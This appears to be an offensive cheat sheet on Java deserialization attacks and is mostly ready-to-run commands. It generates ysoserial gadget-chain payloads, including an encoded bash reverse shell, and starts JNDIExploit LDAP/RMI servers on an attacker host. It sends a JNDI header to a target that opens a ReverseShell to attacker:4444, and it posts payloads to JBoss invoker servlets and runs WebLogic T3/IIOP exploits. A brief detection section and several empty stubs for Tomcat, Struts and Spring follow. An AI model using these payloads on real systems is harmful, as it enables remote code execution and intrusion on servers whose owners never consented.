# Java Deserialization

## 1. ysoserial Basics
```bash
# List payloads
java -jar ysoserial.jar
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,base64}|{base64,-d}|{bash,-i}" | base64 -w0
```

## 2. Common Gadget Chains
```bash
# CommonsCollections1-7
java -jar ysoserial.jar CommonsCollections1 "id"
java -jar ysoserial.jar CommonsCollections2 "id"
java -jar ysoserial.jar CommonsCollections3 "id"
java -jar ysoserial.jar CommonsCollections4 "id"
java -jar ysoserial.jar CommonsCollections5 "id"
java -jar ysoserial.jar CommonsCollections6 "id"
java -jar ysoserial.jar CommonsCollections7 "id"
# CommonsBeanutils
java -jar ysoserial.jar CommonsBeanutils1 "id"
# Groovy
java -jar ysoserial.jar Groovy1 "id"
# JRMPClient
java -jar ysoserial.jar JRMPClient "attacker:1099"
# Jdk7u21
java -jar ysoserial.jar Jdk7u21 "id"
# Spring
java -jar ysoserial.jar Spring1 "id"
java -jar ysoserial.jar Spring2 "id"
```

## 3. JNDI Injection
```bash
# Start LDAP server
java -jar JNDIExploit.jar -i attacker_ip -p 1389
# Trigger
curl -sk "http://target/" -H "X-Api: ${jndi:ldap://attacker:1389/Basic/ReverseShell/attacker/4444}"
# RMI
java -jar JNDIExploit.jar -i attacker_ip -p 1099
```

## 4. WebLogic Deserialization
```bash
# T3 protocol
python3 exploit_t3.py -t target -p 7001
# IIOP protocol
python3 exploit_iiop.py -t target -p 7001
```

## 5. Tomcat Session Deserialization
```bash
# If session is serialized Java object
# Inject ysoserial payload
```

## 6. Apache Struts Deserialization
```bash
# Via Content-Type header
# Via Multipart request
```

## 7. Spring Framework
```bash
# Spring4Shell (CVE-2022-22965)
# Spring Cloud Gateway RCE
```

## 8. JBoss Deserialization
```bash
# JMXInvokerServlet
curl -sk "http://target/invoker/JMXInvokerServlet" -d @payload.ser
# EJBInvokerServlet
curl -sk "http://target/invoker/EJBInvokerServlet" -d @payload.ser
```

## Detection
```bash
# Look for base64 starting with rO0AB (Java serialized object header)
# AC ED 00 05 in hex
# Look for Content-Type: application/x-java-serialized-object
```

## Tools
```bash
# ysoserial
# JNDIExploit
# marshalsec
# Java Deserialization Scanner (Burp)
```
